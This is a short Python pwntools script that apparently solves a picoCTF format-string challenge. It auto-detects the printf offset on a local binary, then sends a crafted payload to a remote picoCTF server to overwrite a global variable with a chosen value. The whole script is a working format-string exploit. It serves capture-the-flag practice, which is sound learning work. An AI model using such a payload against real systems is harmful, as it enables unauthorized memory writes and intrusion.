from pwn import *

context.bits = 64
context.arch = "x86-64"
context.log_level = 69

############################################################
## FINDING THE OFFSET OF OUR PAYLOAD IN THE FORMAT STRING ##
############################################################

def send_payload(payload):
    target = process("./vuln")
    target.recvuntil(b'?')
    target.sendline(payload)
    target.recvuntil(b'input: ')
    return target.recvline()

# Figure out the format of the vulnerable printf
fsv = FmtStr(execute_fmt=send_payload)
offset = fsv.offset

############################################################
############################################################
############################################################

target = remote("rhea.picoctf.net", 55224)

susAddr = 0x404060          # No PIE, can be found in gdb with disass main
desiredValue = 0x67616c66   # Found in source or in gdb

writes = {
    susAddr : desiredValue
}

payload = fmtstr_payload(offset, writes)

target.recvuntil(b'?')
target.sendline(payload)
target.recvuntil(b'...\n')
print(target.recvline().decode())